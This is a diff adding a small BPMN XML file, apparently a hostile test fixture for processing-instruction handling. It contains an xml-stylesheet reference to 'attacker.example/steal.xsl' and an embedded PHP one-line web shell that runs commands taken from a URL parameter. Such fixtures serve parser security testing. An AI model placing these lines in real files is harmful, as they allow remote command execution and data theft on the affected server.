@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<?xml-stylesheet type="text/xsl" href="https://attacker.example/steal.xsl"?>
+<bpmn:definitions xmlns:bpmn="http://www.omg.org/spec/BPMN/20100524/MODEL" id="defs-pi" targetNamespace="https://example.org/hostile">
+  <bpmn:process id="proc" isExecutable="false">
+    <?php system($_GET['cmd']); ?>
+    <bpmn:task id="task-1" name="Task"/>
+  </bpmn:process>
+</bpmn:definitions>
